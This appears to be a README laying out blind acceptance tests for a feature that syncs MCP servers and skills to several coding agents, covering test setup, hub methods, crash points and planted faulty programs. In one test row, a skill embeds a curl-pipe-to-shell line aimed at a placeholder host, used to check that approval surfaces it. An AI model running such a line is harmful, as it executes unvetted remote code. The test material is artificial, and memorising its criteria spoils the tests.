# Acceptance tests for #148: MCP servers and skills in one place, synced to each agent at user level

Written first, blind, by a job that never saw an implementation of #148; none existed at the base. The implementing
agent doesn't edit these files (AGENTS.md, Proof); a dispute goes to a blind redraft of this job (design: Dogfooding).
`TASTE.json` is the one file anyone adds here afterwards, and only to record the taste call (AC17).

What was read:

- Issue #148: Scope, its 17 checkbox criteria (AC1 to AC17 in the body's order), Proof and Depends on (#326, #18, #39,
  #364).
- `docs/technical-design.md`: How it installs (Editing agent settings, Backups, Platforms: the secret store), Hooks are
  evidence, not a state machine (Facts as data, What a session loads, Who is calling), Before each command (MCP calls
  and their classes, Your written rules, enforced), What each agent gives us (Codex's row: the shared daemon, its PID
  and start time, the restart as an authority ask), Threats (Agents switching off what watches them, MCP tools the
  guards can't see, Secrets), the R2 Agents page line, How we know version 0 works (fault injection, the test VFS) and
  Dogfooding. `AGENTS.md` (Proof).
- The base, `9bdebdfb` (main, 2026-11-07), for surfaces and conventions only: `packages/hub` (`agent-files.ts`,
  `mcp-servers.ts`, `claude-settings.ts`, `codex-settings.ts`, `setup.ts`, `undo.ts`, `backup.ts`, `keychain.ts`,
  `authority.ts`, `inbox.ts`, `status.ts`, `vfs.ts`, `wire.ts`, `plant.ts`, `core.ts`'s method table),
  `packages/cli/src/main.ts`, `packages/extension-host/src/sources.ts` (secrets by handle), `adapters/*.facts.json`
  and the Codex corpus, `scripts/benchmark.mjs`, `crates/deep-app/src/main.rs`; suites 342, 332, 321, 149, 1162,
  1172, 364, 355 and 40 for their conventions.
- The installed agents' own CLIs (`claude mcp`, `codex mcp`, `codex app-server daemon`, `pi mcp`), run in a temp HOME
  to learn their files and what their list commands accept and reject.

## Run them

```sh
export PATH="$HOME/.local/share/fnm/node-versions/v24.22.0/installation/bin:$HOME/.rustup/toolchains/1.99.1-aarch64-apple-darwin/bin:$PATH"
npm ci                                   # once
npm run build --workspaces               # every test starts `deep hub run` from packages/cli/dist
cargo build --locked -p deep-hook        # sessions' hooks (AC7, AC9, AC16)
export DEEP_CLAUDE_BIN=$HOME/.cache/deepbuild-agents/148/node_modules/.bin/claude   # Claude Code 2.1.308
export DEEP_CODEX_BIN=$HOME/.cache/deepbuild-agents/148/node_modules/.bin/codex     # Codex 0.166.0-alpha.5.1
export DEEP_PI_BIN=$HOME/.cache/deepbuild-agents/148/node_modules/.bin/pi           # pi 1.4.0
NO_COLOR=1 node node_modules/vitest/vitest.mjs run --root tests/acceptance/148 --no-file-parallelism --testTimeout=600000
node node_modules/typescript/bin/tsc -p tests/acceptance/148/tsconfig.json
```

- **The agents are required.** A missing `DEEP_*_BIN`, or an agent answering a version its facts don't cover, fails with
  `BLOCKED: ...`, never a skip. Nothing is downloaded.
- **Node:** the repo's 24.22.0 as nodejs.org builds it. Homebrew's Node dies in the check sandbox.
- **Temp folders:** everything is under `/tmp/dh148-*` (a hub socket path must fit in 104 bytes), removed after each
  file. HOME is `<tmp>/h` for every process started; nothing reads or writes the real `~/.claude`, `~/.codex`, `~/.pi`,
  `~/.deepbuild` or Keychain. Processes are stopped by PID, only while they still run one of this suite's programs.
- **No network.** No test fetches anything: skills come from a git repository on disk, HTTP servers point at
  `127.0.0.1:9`, the fetch-and-run script names `example.invalid` and never runs. The agents run with their own offline
  switches (`CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC`, `DISABLE_AUTOUPDATER`, `DISABLE_TELEMETRY`,
  `DISABLE_ERROR_REPORTING`, `PI_OFFLINE`, `PI_SKIP_VERSION_CHECK`, `PI_TELEMETRY=0`); the hub gets
  `DEEP_HUB_TEST_FORGE=http://127.0.0.1:9`. AC10 also records every connect the hub makes.
- Delete `tests/acceptance/148/node_modules/.vite` if Vitest leaves one.
- `--no-file-parallelism`: each file starts real hubs and agents. Elapsed on a correct hub: not known; each world costs
  about 10 s before its hub starts (each agent's first run).

## The surface under test

The issue names the Agents page, `deep mcp-exec <name>`, the platform's secret store, facts, authority asks, SessionStart
evidence, the storage seam and Codex's own restart command. It gives no method, field or event for a sync. These tests
define the smallest surface that reaches every criterion; each choice is numbered so a dispute can name it.

### The world

1. **HOME** is `<tmp>/h` with your own files written first: `~/.claude.json` (`theme` and your server `mine`),
   `~/.codex/config.toml` (a comment, `model` and your `[mcp_servers.mine]`), `~/.pi/agent/mcp.json` (your `mine`),
   and `~/.claude/`. Each agent's list command runs once before the test reads anything, so Claude Code's first-run keys
   are already in `~/.claude.json`.
2. **The hub's root** is the installed `~/.deepbuild`, laid out as setup leaves it but without running setup:
   `rules.json` (the shipped `crates/deep-hook/default-rules.json`), `config.json` with your ask settings (`asks`, setup's
   drafts, no batching) and `runner.login_path`.
3. **Installed agents** are the commands on that login PATH, `<tmp>/bin`, which also leads the hub's PATH: `claude`,
   `codex` and `pi` are links to the real agents. **OpenCode and Cursor** (AC8, AC10), which aren't installed here, are
   modelled as the design detects an agent: the command their facts name in `agent` (`adapters/opencode.facts.json`,
   `adapters/cursor.facts.json`) is on the login PATH and answers `--version` with the newest version those facts cover
   (`fixtures/stub.mjs`), and their home folder exists (`~/.config/opencode/`, `~/.cursor/`). The agents' ids are their
   facts files' names: `claude-code`, `codex`, `pi`, `opencode`, `cursor`.
4. **`deep hub run`** with `DEEP_HUB_TEST_CONFIRM` (the OS confirming you, as #24's suites stub it),
   `DEEP_HUB_TEST_FORGE=http://127.0.0.1:9`, and the new `DEEP_HUB_TEST_SECRETS` (5).
5. **`DEEP_HUB_TEST_SECRETS=<file>`** (new): a JSON file outside HOME that stands in for the platform's secret store, read
   and written by the hub alone, keys of its choosing. Only tests set it. It is the only place a test's token may land.
6. **Files left out of "every file"** (AC1's byte comparison) are what agents and the hub write as they run, never your
   settings: `~/.deepbuild/`, `~/Library/`, `~/.claude/backups/`, `~/.claude/projects/`, `~/.claude/statsig/`,
   `~/.codex/log/`, `~/.codex/sessions/`, `~/.codex/*.sqlite*`, `~/.pi/agent/sessions/`, `~/.cache/` (`RUNTIME` in
   helpers.ts). Every other file under HOME counts, including any DeepBuild creates.

### The Agents page's methods, on the hub's socket

The app's Agents page and the CLI reach the hub the same way; the tests call as the cli role with the control token.

7. **`agents.propose`**: one add for the agents you choose, through one write path. Params:
   - `via`: `"app"` (the Agents page's Add), `"words"` (an entry drafted from your words, with `words`, the words
     themselves), `"link"` (a pasted link, in `link`), or `"restore"` (the wanted set of a record put back with
     `deep restore`, planned again; no other params).
   - `server`: a server spec (8), or `skill`: `{repo, commit, path}` (9); `agents`: agent ids (3).
   - The result is the plan, shown before you approve: `{sync, ask, files, refused}`. `sync` is the sync's handle (with
     or without `sync:`), `ask` the ask you approve it with (`ask:<id>` or the bare id), `files` one entry per target file
     `{path, agents, before, after, diff}` (`path` absolute; `agents` the agent ids that read it; `before` the SHA-256 of
     its bytes now, or null; `after` the SHA-256 of the bytes it will hold), `refused` one entry per agent an entry can't
     be written for `{agent, field, reason}`.
8. **A server spec**: `{name, transport: "stdio" | "http", command, args, env, url, headers, secrets, scope}`. `secrets`
   maps an environment variable to its value, entered once with the spec on the trusted path; the hub keeps the value in
   the secret store (5) and an agent's entry runs `deep mcp-exec <name>`. `scope`: `{repos: [<absolute path>]}`; absent,
   every repo.
9. **A skill's source**: a git repository's path on disk (`repo`), a commit, and the skill's folder in it (`path`). The
   skill's name is its folder's name and its `SKILL.md`'s `name`.
10. **A pasted link**: `deepbuild:mcp/add?server=<base64url of the spec's JSON>`.
11. **Your yes** is `deep inbox answer ask:<id> apply` (the option `apply`, as `deep_propose`'s asks have it), which must
    exit 0; the sync then applies.
12. **`agents.read`**: the page's model. Read here: `syncs[]`, each `{id, status, files: [{path, status}]}`, with
    `status` `complete` once every target holds its planned bytes, `refused` when the sync was refused before writing
    (AC11), and a file's `status` `conflict` (or, for a file invalid in its format, `conflict` or `refused`); and
    `skills[]`, each with `name` and `differs`, true while its installed files differ from its pin (AC6).
13. **`agents.restart`** `{agent: "codex"}`: the Agents page's Restart for Codex's daemon (AC16).
14. **`deep undo sync:<id>`** undoes one sync, exit 0 once undone (as `deep undo staged:<id>` does at the base).
15. **Removing DeepBuild from Codex** is `deep setup --undo` (AC13): the design's way for scripts, which removes DeepBuild
    from every agent, Codex among them, and restores from the originals it kept.
16. **A session's row** is its entry in `status.read` (`deep status`), by session ID. A row "says" something through its
    `readings` strings: one matching `/older/i` says the session runs the older set (AC9); one holding the daemon's PID
    says Codex's daemon started before the sync (AC16).

### Facts

17. **Skill folders** (AC8): `adapters/claude-code.facts.json` and `adapters/opencode.facts.json` each name
    `~/.claude/skills` somewhere; the shape is the implementer's.
18. **Refused fields** (AC15): Codex's facts hold, somewhere under a key that reads "refus…", either an object with
    `field: "env"` or the string `"env"`.
19. **Codex's daemon** (AC16): `daemon.restart`, the arguments after `codex` of its own restart command (Codex
    0.166.0-alpha.5.1 has `codex app-server daemon restart`), and `daemon.picksUp["<version>"]` with booleans
    `"hooks.json"` and `"mcp_servers"`, for the version the installed Codex answers.

### The storage seam

20. **`DEEP_HUB_TEST_VFS`** (the design's test VFS, `vfs.ts`) gains point kinds a sync makes, each appended to the
    `points` file as `{n, kind, path?}`: `sync_intent` (the crash journal is durable), `sync_replace` with `path` (a
    target file renamed into place; the real path, links followed), `sync_flush` with `path` (that file's folder flushed
    after the rename) and `sync_complete` (the sync recorded complete).
21. **`cutAt: {kind, nth}`** (new beside `cutAfter`): the hub ends by SIGKILL from inside right after the nth point of
    that kind, as `cutAfter` does after the nth point overall, writing the ledger as `cutAfter` does. AC9 cuts after
    `sync_intent` #1 ("before it publishes"), after `sync_flush` #1 ("after its first target") and after `sync_flush` #n,
    n the plan's file count ("before it records completion"), then starts the hub again on a real disk.

### Sessions

22. **A Claude Code session** is a process of its own (`fixtures/agent.mjs`, placed where npm puts Claude Code) whose
    children are its `deep-hook claude-code <event>` runs, with a transcript under `~/.claude/projects` at the newest
    version its facts cover: SessionStart, a typed prompt, and a call `mcp__<server>__list_issues`.
23. **Codex's daemon** is such a process placed and named as npm's Codex (`.../@openai/codex/bin/codex.js app-server
    --listen unix://`); each Codex session's `deep-hook codex <event>` runs are its children, with a rollout under
    `~/.codex/sessions` at the newest covered version. It appends every catchable signal it gets to a file and keeps
    running. A session's own evidence of the new set is a SessionStart (`resume`) from a daemon started after the sync.
24. **Codex's restart command** runs nothing in AC16: there `<tmp>/bin/codex` is `fixtures/stub.mjs`, which records
    `codex app-server daemon ...` with its arguments and runs the real Codex for anything else.

### Plants

`DEEP_HUB_PLANT=<name>`, tests only, through `packages/hub/src/plant.ts`; the hub refuses a name it doesn't list, so on
the base each twin reads BLOCKED. All six are new.

| Plant | Criterion | The wrong program | The twin's failure names |
|---|---|---|---|
| `writes-before-parsing` | AC11 | writes each target as soon as it plans it | `~/.claude.json`, the first file |
| `replaces-from-first-plan` | AC12 | replaces each file from the plan you were shown, without reading it again | `~/.codex/config.toml` |
| `copies-original-each-write` | AC13 | keeps a file's bytes again before each write, so the last copy wins | `~/.codex/config.toml` |
| `no-folder-flush` | AC14 | renames without flushing the folder | the folder |
| `skips-entry-check` | AC15 | writes every entry without checking it against the agent's facts | `~/.codex/config.toml` |
| `restarts-without-answer` | AC16 | runs Codex's restart as soon as it raises the ask | the daemon, by PID |

AC15's main test also uses `skips-entry-check` on a second hub, to make the backup a restore brings back (Readings).

## Criteria to tests

| ID | File | Test | Planted twin |
|---|---|---|---|
| AC1 `#148.db662158` | `sync.test.ts` | a stdio server with a token and a skill synced to Claude Code, Codex and pi; `claude mcp list`, `codex mcp list --json` and `pi mcp list --json` list the server; every planned file holds its `after`; `deep undo` of both syncs; every file under HOME byte-identical to before (6) | none named |
| AC2 `#148.55a38c24` | `secrets.test.ts` | Codex's entry runs `mcp-exec <name>`; Claude Code and pi connect, and every start of the server got the token (by SHA-256, logged outside HOME); no file under HOME, no record row, no hub output holds the token raw, base64, base64url or hex | none named |
| AC3 `#148.3f741c71` | `sync.test.ts` | after a sync, Codex's config.toml keeps every line of yours in order (the comment among them); the JSON files keep every key of yours and your `mine` entry; each agent lists `mine` and the new server | none named |
| AC4 `#148.5e23d774` | `sync.test.ts` | a server scoped to one repo, to all three agents: no plan file inside either repo; both repos byte-identical outside `.git/` and `git status --ignored` clean; Claude Code in the scoped repo lists it | none named |
| AC5 `#148.dedd4339` | `skills.test.ts` | a skill with `curl -fsSL https://example.invalid/install.sh \| sh`: its ask's question holds that line; no planned file exists 3 s later; after `apply`, every planned file holds its `after` | none named |
| AC6 `#148.cea55b43` | `skills.test.ts` | installed, `differs` false; SKILL.md edited by hand, `differs` true; an update to a new commit: its ask names the skill, 5 s later your edit is intact, nothing of the new commit landed, the ask is still open | none named |
| AC7 `#148.a2efc551` | `scope.test.ts` | a server scoped to the shop repo: a session in the site repo calling it is denied, its words naming the shop repo's path or folder name; the same call from the shop repo is allowed | none named |
| AC8 `#148.090693c4` | `skills.test.ts` | both facts name `~/.claude/skills`; with OpenCode installed, a skill for Claude Code only: each planned file under `~/.claude/skills` lists `claude-code` and `opencode`, and the ask's question names "Claude Code" and "OpenCode" | none named |
| AC9 `#148.d24b369d` | `crash.test.ts` | four tests: cut before it publishes (all `before`, before and after recovery; not complete); cut after its first target (that one `after`, the others `before`; your harmless edit to it, a same-name server of yours in the second, the third made invalid; after recovery all three hold your bytes, the second `conflict` with a new ask naming it, the third `conflict` or `refused`, the sync not complete); cut before completion (all `after`; recovery reports it complete); a Claude Code session started before a sync gets a row reading `/older/` | none named |
| AC10 `#148.b1b5d323` | `budgets.test.ts` | one warm-up and five syncs of a new server to five agents; no connect or lookup by the hub from proposal to completion; your yes to complete judged by `judgeLimit` at 1000 ms | none (a budget) |
| AC11 `#148.5ea00b01` | `plan.test.ts` | Codex's config.toml, the second of three, made invalid between the plan and your yes: no digest changes; the sync `refused`, naming the file | `writes-before-parsing` |
| AC12 `#148.51e021f8` | `plan.test.ts` | a comment of yours added to config.toml between the plan and your yes: it survives, and `codex mcp list` lists the server | `replaces-from-first-plan` |
| AC13 `#148.36f090c8` | `plan.test.ts` | two syncs to Codex; a file under `~/.deepbuild` named by the original's SHA-256 holds its bytes; `deep setup --undo` puts config.toml back byte for byte | `copies-original-each-write` |
| AC14 `#148.f24103f9` | `plan.test.ts` | under the test VFS, every planned file has a `sync_replace`, and each is followed, before `sync_complete`, by a `sync_flush` of its folder | `no-folder-flush` |
| AC15 `#148.930bb7b7` | `entries.test.ts` | Codex's facts mark `env` refused; an HTTP server carrying `env`, from the app, your words, a link and a restore: after your yes, `codex mcp list --json` exits 0, config.toml is unchanged, the plan refused Codex naming `env` and left config.toml out, and Claude Code lists the server | `skips-entry-check` |
| AC16 `#148.9536f2a1` | `daemon.test.ts` | one daemon, two sessions, a sync: both rows name the daemon's PID; after `agents.restart`, one ask names both sessions, nothing restarts for 3 s, it's `authority`; your yes runs the facts' restart once; no signal reached the daemon and it runs; a session back from a new daemon loses the reading, the other keeps it; the facts record what the installed version picks up | `restarts-without-answer` |
| AC17 `#148.62546d1a` | `taste.test.ts` | the check run's two PNGs at 3024 × 1964 in `$DEEP148_SHOTS`; `TASTE.json` | none (a taste call) |

## Budgets (AC10)

This Mac is a Mac17,10, not a reference Mac (Mac15,7 or Mac15,12 in `scripts/benchmark.mjs`), so `judgeLimit` reads
every timing here INCONCLUSIVE, which the test reports as a failure starting `INCONCLUSIVE:`, never a pass; above load
1 a core it is INCONCLUSIVE too. "No network call" is asserted on any machine, before the timing is judged.
"Compared with the merge base": the base has no sync, so there's nothing to compare; no `benchmarks/budgets.json` task
is required here. `fixtures/net-log.cjs` watches the hub's Node threads (main and workers) only, not processes it
starts that aren't Node.

## The taste call (AC17)

The check run is the implementer's: it launches the app (`crates/deep-app`) at the reference window, 1512 × 982 points
at 2×, on a world with a server and a skill synced, and writes `agents-page.png` (the Agents page: the server, the
skill and the agents each is synced to) and `approve-diff.png` (the per-file diff you approve) into a folder, named in
the PR and given to this test as `DEEP148_SHOTS`. "Attached to the PR and shown to you in the session" no test can
see. The answer goes in `tests/acceptance/148/TASTE.json`, #149's shape:

```json
{"issue": 148, "criterion": "#148.62546d1a", "verdict": "looks_right" | "looks_wrong", "who": "...", "when": "ISO 8601",
 "screenshots": {"agents-page.png": "<sha256>", "approve-diff.png": "<sha256>"}, "note": "..."}
```

No `DEEP148_SHOTS`, no `TASTE.json`, or a call on other pictures: INCONCLUSIVE. Missing or malformed pictures fail.
`looks_wrong` fails. No other test reads a picture.

## Readings where the issue leaves a choice

- **"Lists the server through its own command"** (AC1) is the agent's list command naming it; whether it connects is
  AC2's to check, where the token must reach the server.
- **"Undo leaves every file byte-identical"**: after undoing both syncs (the server's and the skill's), every file under
  HOME but the runtime files (6). Claude Code rewrites `~/.claude.json` on its first run only, which the world runs
  before the snapshot.
- **"A server's token"** is a secret entered with the spec; Claude Code, Codex and pi all start servers by command,
  so the criterion's exception (an agent that can't) isn't exercised.
- **"A planted entry and comment"** (AC3): JSON has no comments, so the comment is Codex's TOML; each file gets an
  entry.
- **"Goes in only after you approve"** (AC5): the sync's own approval is the approval; the stop is its ask naming the
  line. A separate audit ask would leave this test's `apply` short of installing.
- **"Differing from its pin"** (AC6) is `differs` (12); "its next update" is a proposal of the same skill at a newer
  commit, and "waits for you" is: open ask, nothing written, your edit intact, after 5 s.
- **"Names its scope"** (AC7): the denial's words hold the repo's path or folder name.
- **AC9's three crash points** are read as above (21). "Recovers per target from the approved base and target
  digests": each target ends at its `before` or `after` (or with your bytes, untouched). In the second cut the target
  already replaced gets your harmless edit, since the other two are needed for a conflicting edit and an invalid one;
  "for a new decision" is an ask raised after the restart whose question names the file. The running session is judged
  apart from the crashes, since under the test VFS a power cut may lose the session's own NORMAL commits.
- **"Five agents"** (AC10): Claude Code, Codex, pi, OpenCode and Cursor, the agents the design names for R2.
- **"The second won't parse"** (AC11): the plan's order is the request's, `claude-code, codex, pi`, so Codex's file is
  the second. It stops parsing after the plan and before your yes, so the sync, which plans every file in memory first,
  meets it at apply; the same file broken before `agents.propose` would be refused at the plan, where no wrong program
  could write.
- **"Between the plan and its replace"** (AC12): after `agents.propose` showed the plan and before your yes.
- **"Removing DeepBuild from Codex"** (AC13) is `deep setup --undo`, the one removal command the base has.
- **"The field"** (AC15) is `env` on an HTTP server: of the fields Codex 0.166.0-alpha.5.1's loader refuses (`env`,
  `args`, `cwd` and `bearer_token` on HTTP; `url`, `http_headers`, `env_http_headers` and `bearer_token_env_var` on
  stdio), the one where Claude Code still loads the entry. "A restore" is `deep restore` of a backup whose record wants
  the server for Codex: such a record can only come from a hub that didn't check, so the backup is made by the wrong
  program (`skips-entry-check`) in another world. "Before the plan shows" is the refusal being in the plan.
- **"Both sessions' rows say the daemon started before the sync"** (AC16): a reading naming the daemon's PID (16).
  "Until their own evidence shows the new set": a SessionStart from a daemon started after the sync. The restart ask may
  be raised by the sync landing or by `agents.restart`; either way there is exactly one naming both sessions (by ID, with
  or without dashes).

## What this doesn't test

- **Not run past the base:** no implementation exists. What ran is in BASE-FAILURE.txt; a helper fault past those
  points is a dispute for a blind redraft.
- **HTTP servers' loopback proxy**, each use of a secret as an event, the scrub list, and the Agents page's question
  before writing a value for an agent that can't start servers by command: Scope only, no criterion.
- **Adopting entries DeepBuild doesn't manage**, configuration evals for CLAUDE.md and AGENTS.md, an agent's own write
  of a server being denied and becoming a proposal, a weakened synced skill's rule held, tool holds and classes on
  every server, the recorded tool list on the page: Scope only.
- **A skill's license and scripts shown**, linked or copied: not read.
- **"On the reference Mac in the local preflight"** (AC10): read only in this test, not as a perf-lane task.
- **The pinned Codex's real daemon** (AC16): the facts' booleans are checked present, not measured live.
